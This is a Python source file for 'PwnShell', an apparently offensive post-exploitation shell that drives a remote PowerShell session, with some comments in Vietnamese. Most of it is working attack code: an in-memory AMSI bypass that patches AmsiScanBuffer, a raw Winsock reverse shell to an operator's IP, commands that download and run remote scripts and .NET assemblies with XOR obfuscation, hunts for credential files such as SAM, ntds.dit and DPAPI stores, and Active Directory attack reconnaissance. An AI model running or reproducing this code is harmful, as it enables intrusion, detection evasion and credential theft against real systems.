"""
shell.pwnshell — PwnShell interactive shell
"""

import os, sys, logging, time, textwrap
from pathlib import PureWindowsPath, Path
from ipaddress import ip_address
from base64 import b64decode
from random import randbytes
from datetime import datetime
from Cryptodome.Hash import MD5

try:
    from prompt_toolkit import prompt, ANSI
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.completion import WordCompleter
    _PTK = sys.stdout.isatty()
except ImportError:
    _PTK = False

# ── imports from sibling modules ─────────────────────────────────────────────
from .ui       import R, G, Y, B, M, C, W, DIM, BLD, RST, c, _BANNER, _COMPLETIONS
from .ctrlc    import CtrlCHandler
from .adtriage import get_adtriage_ps
from .commands import (
    chunks, b64str, split_args, xorenc, str_b64,
    _xor_key,
    new_HostWriter, import_HostWriter,
    call_XorEnc, import_XorEnc,
    _importPathFix, _new_PathFix,
    # dll_import generated variables:
    _import_LoadLibrary,    _call_LoadLibrary,
    _import_GetProcAddress, _call_GetProcAddress,
    _import_VirtualProtect, _call_VirtualProtect,
    _import_CreateProcess,  _call_CreateProcess,
    _import_WSAStartup,     _call_WSAStartup,
    _import_WSASocket,      _call_WSASocket,
    _import_WSAConnect,     _call_WSAConnect,
)


# ─────────────────────────────────────────────────────────────────────────────
#  COPY NGUYÊN VĂN class PwnShell từ pwnrm.py GỐC vào đây
#  (từ dòng "class PwnShell:" đến hết method "download")
#  KHÔNG THAY ĐỔI BẤT KỲ LOGIC NÀO BÊN TRONG CLASS
# ─────────────────────────────────────────────────────────────────────────────

# ── PwnShell ──────────────────────────────────────────────────────────────────
class PwnShell:

    VERSION = "1.0.1"

    def __init__(self, runspace, target_info: dict | None = None):
        self.runspace    = runspace
        self.cwd         = ""
        self.stdout_log  = None
        self.need_clear  = False
        self.start_time  = datetime.now()
        self.target_info = target_info or {}
        self.cmd_count   = 0

        if _PTK:
            self.prompt_history = FileHistory(".pwnrm_history")
            self._completer = WordCompleter(_COMPLETIONS, ignore_case=True)

    def __del__(self):
        self.stop_log()

    # ── logging ───────────────────────────────────────────────────────────────
    def start_log(self):
        if not self.stdout_log:
            fn = f"pwnrm_{int(time.time())}_stdout.log"
            self.write_info(f"Logging to {c(C, fn)}")
            self.stdout_log = open(fn, "wb")

    def stop_log(self):
        if self.stdout_log:
            self.stdout_log.close()
            self.stdout_log = None

    # ── help / banner ─────────────────────────────────────────────────────────
    def help(self):
        elapsed = str(datetime.now() - self.start_time).split(".")[0]
        tgt = self.target_info.get("host","?")
        usr = self.target_info.get("user","?")

        print(_BANNER)
        print(textwrap.dedent(f"""\
        {BLD}  Session Info{RST}
          Target  : {c(C,tgt)}
          User    : {c(G,usr)}
          Elapsed : {elapsed}    Commands run: {self.cmd_count}

        {BLD}  Key Commands{RST}

          {c(Y,'!download')} RPATH [LPATH]          Pull file/dir (dirs → ZIP)
          {c(Y,'!upload')} [-xor] LPATH [RPATH]     Push file; -xor for stealthy staging
          {c(Y,'!amsi')}                             Patch AmsiScanBuffer in-process
          {c(Y,'!psrun')} [-xor] URL                Load & exec remote PS1 (obfuscated ScriptBlock)
          {c(Y,'!netrun')} [-xor] URL [ARG..]        Load & exec remote .NET assembly
          {c(Y,'!revshell')} IP PORT                 Raw Winsock reverse shell (full I/O)
          {c(Y,'!adtriage')} [-q]                    {c(M,'[NEW]')} AD post-auth recon:
                                               SPNs · AS-REP · delegation · ADCS·
                                               gMSA/dMSA · ACL quick-wins · BadSuccessor
          {c(Y,'!sysinfo')}                          Quick OS / AV / hotfix snapshot
          {c(Y,'!creds')}                            DPAPI / PowerShell history / credential hint
          {c(Y,'!log')} / {c(Y,'!stoplog')}                  Toggle session transcript
          exit / quit / Ctrl+D               Close session
          Ctrl+C                             Gracefully interrupt running command

        {c(DIM,'  Tab-completion available for all ! commands.')}
        """))

    # ── REPL ──────────────────────────────────────────────────────────────────
    def repl(self, inputs=None):
        self.update_cwd()

        for raw in (inputs or self.read_line()):
            cmd = raw.strip()
            if not cmd:
                continue
            self.cmd_count += 1

            if cmd in {"exit","quit","!exit","!quit"}:
                print(c(DIM, "\n  [~] Session closed. Stay stealthy.\n"))
                return

            dispatch = [
                ("!download ",  self.download),
                ("!upload ",    self.upload),
                ("!amsi",       lambda _: self.amsi_bypass()),
                ("!netrun ",    self.netrun),
                ("!psrun ",     self.psrun),
                ("!revshell ",  self.revshell),
                ("!adtriage",   self._adtriage_dispatch),
                ("!sysinfo",    lambda _: self.sysinfo()),
                ("!creds",      lambda _: self.creds_hint()),
                ("!log",        lambda _: self.start_log()),
                ("!stoplog",    lambda _: self.stop_log()),
            ]

            matched = False
            for prefix, fn in dispatch:
                if cmd.lower().startswith(prefix.lower()):
                    fn(cmd[len(prefix):].strip())
                    matched = True
                    break

            if not matched:
                if cmd.startswith("!") or cmd in {"help","?"}:
                    self.help()
                else:
                    if self.stdout_log:
                        self.stdout_log.write(f"PS {self.cwd}> {cmd}\n".encode())
                        self.stdout_log.flush()
                    self.run_with_interrupt(cmd, self.write_line)
                    self.update_cwd()

    # ── prompt / input ────────────────────────────────────────────────────────
    def update_cwd(self):
        self.cwd = self.run_sync("Get-Location | Select -Expand Path").strip()

    def read_line(self):
        while True:
            try:
                ps_pre = f"{BLD}{M}PwnRM{RST}|{c(C,self.cwd)}> "
                if _PTK:
                    cmd = prompt(ANSI(ps_pre), history=self.prompt_history,
                                 completer=self._completer,
                                 enable_history_search=True)
                else:
                    cmd = input(ps_pre)
            except KeyboardInterrupt:
                continue
            except EOFError:
                return
            else:
                yield cmd

    # ── output handlers ───────────────────────────────────────────────────────
    def _clear(self):
        return "\033[2K\r" if self.need_clear else ""

    def write_line(self, out):
        clr = self._clear(); self.need_clear = False
        log = b""
        if "stdout" in out:
            print(clr + out["stdout"], flush=True)
            log = out["stdout"].encode() + b"\n"
        elif "info" in out:
            print(clr + out["info"], end=out["endl"], flush=True)
            log = (out["info"] + out["endl"]).encode()
        elif "error" in out:
            print(clr + c(R, out["error"]), flush=True)
        elif "warn" in out:
            print(clr + c(Y, "  [!] " + out["warn"]), flush=True)
        elif "verbose" in out:
            print(clr + c(DIM, out["verbose"]), flush=True)
        elif "progress" in out:
            print(clr + c(B, "  [~] " + out["progress"]), end="\r", flush=True)
            self.need_clear = True
        if self.stdout_log and log:
            self.stdout_log.write(log); self.stdout_log.flush()

    def write_info(self, msg):    self.write_line({"info": msg, "endl": "\n"})
    def write_warning(self, msg): self.write_line({"warn": msg})
    def write_error(self, msg):   self.write_line({"error": msg})
    def write_progress(self, msg):self.write_line({"progress": msg})

    def run_sync(self, cmd):
        return "\n".join(
            o.get("stdout","") for o in self.runspace.run_command(cmd) if "stdout" in o
        )

    def run_with_interrupt(self, cmd, handler=None, exc_handler=None):
        stream = self.runspace.run_command(cmd)
        while True:
            with CtrlCHandler(timeout=5) as h:
                try:
                    out = next(stream)
                except StopIteration:
                    break
                except Exception as e:
                    if exc_handler and exc_handler(e):
                        continue
                    raise
                if handler:
                    handler(out)
            if h.interrupted:
                self.runspace.interrupt()
                return True
        return False

    # ══════════════════════════════════════════════════════════════════════════
    #  BUILT-IN COMMANDS
    # ══════════════════════════════════════════════════════════════════════════

    # ── !adtriage (NEW in v1.0.1) ─────────────────────────────────────────────
    def _adtriage_dispatch(self, args):
        quick = "-q" in args.lower() or "--quick" in args.lower()
        self.adtriage(quick=quick)

    def adtriage(self, quick=False):
        """
        AD Triage — runs an entirely self-contained PowerShell enumeration
        inside the remote session.  No extra binaries needed on target.
        Covers: identity, domain basics, HV groups, Kerberoast, AS-REP,
        unconstrained/constrained/RBCD delegation, ADCS (ESC1/3/4 quick scan),
        gMSA/dMSA (BadSuccessor hint), ACL quick-wins, pre-2000 compat access,
        and accounts with password-never-expires + adminCount=1.
        """
        self.write_info(c(M+BLD, "  [*] PwnRM AD Triage — loading remote enumeration module..."))
        ps = get_adtriage_ps(quick=quick)
        # Inject as a ScriptBlock to stay under AMSI radar
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"powershell -NonInteractive -EncodedCommand {encoded}"
        # Prefer direct Invoke-Expression so the output streams correctly
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        self.run_with_interrupt(cmd, self.write_line)

    # ── !sysinfo ──────────────────────────────────────────────────────────────
    def sysinfo(self):
        self.write_info(c(C, "  [*] System snapshot"))
        cmds = [
            # OS / hostname / build
            'Write-Host "`n[OS]"; $o=Get-WmiObject Win32_OperatingSystem;'
            '"  Name     : "+$o.Caption; "  Build    : "+$o.BuildNumber;'
            '"  Hostname : "+$env:COMPUTERNAME; "  Domain   : "+$env:USERDNSDOMAIN',
            # Hotfixes (last 10)
            'Write-Host "`n[Hotfixes (last 10)]";'
            'Get-HotFix | Sort InstalledOn -Desc | Select -First 10 | '
            'ForEach-Object { "  "+$_.HotFixID+" "+$_.Description+" "+$_.InstalledOn }',
            # AV products
            'Write-Host "`n[AV Products]";'
            'try { Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct |'
            'ForEach-Object { "  "+$_.displayName } } catch { "  (SecurityCenter2 not available)" }',
            # Local admins
            'Write-Host "`n[Local Administrators]";'
            'net localgroup administrators 2>$null | Select-Object -Skip 6 | '
            'Where-Object { $_ -and $_ -notmatch "----" } | ForEach-Object { "  "+$_ }',
            # WinRM / SMB signing
            'Write-Host "`n[WinRM / SMB]";'
            '"  WinRM port : 5985/5986";'
            'try { $s=Get-SmbServerConfiguration; "  SMB Signing Required: "+$s.RequireSecuritySignature } catch {}',
        ]
        for c_ in cmds:
            self.run_with_interrupt(c_, self.write_line)

    # ── !creds (DPAPI / history hints) ───────────────────────────────────────
    def creds_hint(self):
        self.write_info(c(C, "  [*] Credential artifact hints"))
        ps = r"""
$targets = @(
    "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
    "$env:APPDATA\Microsoft\Credentials",
    "$env:LOCALAPPDATA\Microsoft\Credentials",
    "$env:APPDATA\Microsoft\Protect",
    "C:\Windows\System32\config\SAM",
    "C:\Windows\NTDS\ntds.dit",
    "C:\inetpub\wwwroot\web.config",
    "C:\Windows\Panther\unattend.xml",
    "C:\ProgramData\McAfee\Agent\DB\ma.db"
)
foreach ($t in $targets) {
    if (Test-Path $t -ErrorAction SilentlyContinue) {
        Write-Host "  [+] FOUND: $t" -ForegroundColor Green
    }
}
# Check for saved credentials
$creds = cmdkey /list 2>$null
if ($creds -match "Target") { Write-Host "`n  [!] cmdkey entries:" -ForegroundColor Yellow; $creds | Write-Host }
Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAPI dump"
"""
        self.run_with_interrupt(ps, self.write_line)

    # ── !amsi ─────────────────────────────────────────────────────────────────
    def amsi_bypass(self):
        cmds = [
            _import_LoadLibrary, _import_GetProcAddress, _import_VirtualProtect,
            f"$addr = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('amsi.dll')}), {str_b64('AmsiScanBuffer')})",
            f"{_call_VirtualProtect}($addr, [IntPtr]6, 64, [ref]$null)",
            "Start-Sleep -Seconds 1",
            "[Runtime.InteropServices.Marshal]::Copy([byte[]](0xb8,0x57,0,7,0x80,0xc3), 0, $addr, 6)",
            "Start-Sleep -Seconds 1",
            f"{_call_VirtualProtect}($addr, [IntPtr]6, 32, [ref]$null)",
        ]
        self.write_info(c(Y, "  [*] Patching AmsiScanBuffer..."))
        for cmd in cmds:
            logging.debug(cmd)
            self.run_with_interrupt(cmd, self.write_line)
        self.write_info(c(G, "  [+] AMSI bypass applied."))

    # ── !psrun ────────────────────────────────────────────────────────────────
    def psrun(self, cmdline):
        args   = split_args(cmdline)[:2]
        url    = args[-1]
        xorfunc= ""
        if args[0].lower() == "-xor":
            if len(args) != 2:
                self.write_warning("usage: !psrun [-xor] URL"); return
            if args[-1].lower().startswith("http"):
                self.write_warning("Use -xor only with files uploaded via !upload -xor"); return
            xorfunc = call_XorEnc
        cmds = [
            import_XorEnc,
            f"$c = (New-Object Net.WebClient).DownloadData({str_b64(url)})",
            f"$c = [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString(({xorfunc}($c))))",
            "$c = $c.Ast.EndBlock.Copy()",
            "$a = [ScriptBlock]::Create('Get-ChildItem').Ast",
            "$b = [Management.Automation.Language.ScriptBlockAst]::new($a.Extent,$null,$null,$null,$c,$null)",
            "Invoke-Command -NoNewScope -ScriptBlock $b.GetScriptBlock()",
            "Remove-Variable @('a','b','c')"
        ]
        for cmd in cmds:
            logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)

    # ── !netrun ───────────────────────────────────────────────────────────────
    def netrun(self, cmdline):
        args = split_args(cmdline)
        if args[0].lower() == "-xor":
            if len(args) == 1:
                self.write_warning("usage: !netrun [-xor] URL [ARG..]"); return
            xorfunc = call_XorEnc
            args    = args[1:]
        else:
            xorfunc = ""
        args = [str_b64(a) for a in args]
        url  = args[0]
        argv = "[string[]]@(" + ",".join(args[1:]) + ")"
        cmds = [
            import_HostWriter, import_XorEnc,
            f"$buf = (New-Object Net.WebClient).DownloadData({url})",
            f"$dll = [Reflection.Assembly]::Load({xorfunc}($buf))",
            f"$out = {new_HostWriter}",
            f"[Console]::SetOut($out); [Console]::SetError($out)",
            f"$dll.EntryPoint.Invoke($null,(,{argv}))",
            "[Console]::SetOut([IO.StreamWriter]::Null)",
            "[Console]::SetError([IO.StreamWriter]::Null)",
            "$out.Dispose()",
            "Remove-Variable @('buf','dll','out')"
        ]
        for cmd in cmds:
            logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)

    # ── !revshell ─────────────────────────────────────────────────────────────
    def revshell(self, cmdline):
        args = split_args(cmdline)
        try:
            ip   = ip_address(args[0]).packed
            port = int(args[1])
            p_hi, p_lo = (port >> 8) & 0xff, port & 0xff
        except:
            self.write_warning("usage: !revshell IP PORT"); return
        cmds = [
            _import_WSAStartup, _import_WSASocket, _import_WSAConnect, _import_CreateProcess,
            f"{_call_WSAStartup}(0x202,(New-Object byte[] 64))",
            f"$sock = {_call_WSASocket}(2,1,6,0,0,0)",
            f"{_call_WSAConnect}($sock,[byte[]](2,0,{p_hi},{p_lo},{ip[0]},{ip[1]},{ip[2]},{ip[3]},12,0,0,0,0,0,0,0,0),16,0,0,0,0)",
            f"$sinfo = [int64[]](104,0,0,0,0,0,0,0x10100000000,0,0,$sock,$sock,$sock)",
            f"{_call_CreateProcess}(0,'cmd.exe',0,0,1,0,0,0,$sinfo,(New-Object byte[] 32))",
            "Remove-Variable @('sock','sinfo')"
        ]
        self.write_info(c(Y, f"  [*] Spawning reverse shell → {args[0]}:{args[1]}"))
        for cmd in cmds:
            logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)

    # ── !upload ───────────────────────────────────────────────────────────────
    def upload(self, cmdline):
        args = split_args(cmdline)
        if args[0].lower() == "-xor":
            unxor = False; args = args[1:]
        else:
            unxor = True
        src = Path(args[0])
        dst = PureWindowsPath(args[1] if len(args) == 2 else src.name)
        try:
            with open(src,"rb") as f: buf = f.read()
        except IOError as e:
            self.write_error(str(e)); return

        tmpfn = self.run_sync("[IO.Path]::GetTempPath()") + randbytes(8).hex() + ".tmp"
        total = 0
        self.write_info(f"  [~] Uploading → {c(C,str(tmpfn))}")
        self.run_sync(import_XorEnc)
        for chunk in chunks(buf, 65536):
            total += len(chunk)
            chunk_b64 = f"[Convert]::FromBase64String('{b64str(xorenc(chunk, _xor_key))}')"
            xorfunc   = call_XorEnc if unxor else ""
            cmd = f"Add-Content -Encoding Byte '{tmpfn}' ([byte[]]$({xorfunc}({chunk_b64})))"
            if self.run_with_interrupt(cmd):
                self.write_warning("Upload interrupted"); self.run_sync(f"Remove-Item -Force '{tmpfn}'"); return
            self.write_progress(f"Upload {total}/{len(buf)} bytes")
        self.write_info(f"  [~] Moving to {c(C,str(dst))}")
        self.run_with_interrupt(f"Move-Item -Force -Path '{tmpfn}' -Destination '{dst}'", self.write_line)
        h = self.run_sync(f"(Get-FileHash '{dst}' -Algorithm MD5).Hash")
        ok = MD5.new(buf if unxor else xorenc(buf, _xor_key)).hexdigest().upper()
        if h.strip() != ok:
            self.write_error("  Upload integrity check FAILED — file may be corrupted!")
        else:
            self.write_info(c(G, "  [+] Upload complete — MD5 verified."))

    # ── !download ─────────────────────────────────────────────────────────────
    def download(self, cmdline):
        args = split_args(cmdline)
        if not args or len(args) > 2:
            self.write_warning("usage: !download RPATH [LPATH]"); return

        # [GHSA-x4cv-p53p-wh3w - SECURITY FIX 1] Lấy tên file từ CHÍNH INPUT CỦA USER (args[0]).
        # Tuyệt đối không dùng src.name do server trả về để tránh bị spoof tên file độc hại.
        user_rpath = PureWindowsPath(args[0])
        safe_filename = user_rpath.name
        
        # Fallback nếu user truyền đường dẫn root (vd: "C:\") thì không có tên file
        if not safe_filename:
            safe_filename = "downloaded_file"

        # Giữ nguyên logic query server để lấy đường dẫn thật (dùng cho logging và check directory)
        src = self.run_sync(f"Resolve-Path -LiteralPath '{args[0]}' | Select -Expand Path")
        if not src:
            self.write_warning(f"{args[0]} not found on remote"); return
        src = PureWindowsPath(src.strip())
        
        # [GHSA-x4cv-p53p-wh3w - SECURITY FIX 2] Build đường dẫn local dựa trên safe_filename thay vì src.name
        dst = Path(args[1]) if len(args) == 2 else Path(safe_filename)
        if dst.is_dir(): 
            dst = dst / safe_filename
            
        # [DEFENSE IN DEPTH] Chặn local path traversal nếu user lỡ gõ ".." vào LPATH
        # (Mặc dù CLI thường cho phép, nhưng chặn ở mức filename để an toàn hơn)
        if '..' in dst.name:
            self.write_error("Invalid characters ('..') in destination filename."); return

        if not dst.parent.exists(): 
            os.makedirs(dst.parent, exist_ok=True)

        is_dir = self.run_sync(f"Test-Path -Path '{src}' -PathType Container") == "True"
        if is_dir:
            # Logic tải thư mục vẫn hoạt động bình thường với safe_filename
            if not dst.name.lower().endswith(".zip"): 
                dst = dst.parent / f"{dst.name}.zip"
                
            self.write_info(f"  [~] Directory → ZIP download: {c(C,str(dst))}")
            tmpdir = self.run_sync("[System.IO.Path]::GetTempPath()")
            tmpnm  = randbytes(8).hex()
            tmpfn  = tmpdir + tmpnm
            ps = f"""
Add-Type -AssemblyName "System.IO.Compression.FileSystem"
New-Item -Path '{tmpdir}' -ItemType Directory -Name '{tmpnm}' | Out-Null
Get-ChildItem -Force -Recurse -Path '{src}' | ForEach-Object {{
    if(-not ($_.FullName -Like "*{tmpnm}*")) {{
        try {{
            $d = $_.FullName.Replace('{src}', '')
            Copy-Item -ErrorAction SilentlyContinue -Force $_.FullName "{tmpfn}\\$d"
        }} catch {{ Write-Warning "skipping $d" }}
    }}
}}
{_importPathFix}
[IO.Compression.ZipFile]::CreateFromDirectory('{tmpfn}', '{tmpfn}.zip',
    [IO.Compression.CompressionLevel]::Fastest, $true, ${_new_PathFix})
Remove-Item -Recurse -Force -Path '{tmpfn}'
"""
            self.run_with_interrupt(ps, self.write_line)
            src = tmpfn + ".zip"

        ps = f"""function Download-Remote {{
    $h = Get-FileHash '{src}' -Algorithm MD5 | Select -Expand Hash;
    $f = [System.IO.File]::OpenRead('{src}');
    $b = New-Object byte[] 65536;
    while(($n = $f.Read($b, 0, 65536)) -gt 0) {{ [Convert]::ToBase64String($b, 0, $n) }};
    $f.Close();
    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($h));
}}
Download-Remote
Remove-Item Function:Download-Remote
"""
        self.write_info(f"  [~] Streaming {c(C,str(src))} ...")
        buf = bytearray()

        def collect(out):
            if part := out.get("stdout"):
                buf.extend(b64decode(part))
                self.write_progress(f"Download {len(buf)} bytes")

        self.run_with_interrupt(ps, collect)

        if is_dir: self.run_sync(f"Remove-Item -fo '{src}'")
        if buf[-32:] != MD5.new(buf[:-32]).hexdigest().upper().encode():
            self.write_error("  Download integrity check FAILED!")
            return
            
        self.write_info(f"  [+] Writing {c(G,str(dst.resolve()))}")
        try:
            with open(dst,"wb") as f: f.write(buf[:-32])
        except IOError as e:
            self.write_error(str(e))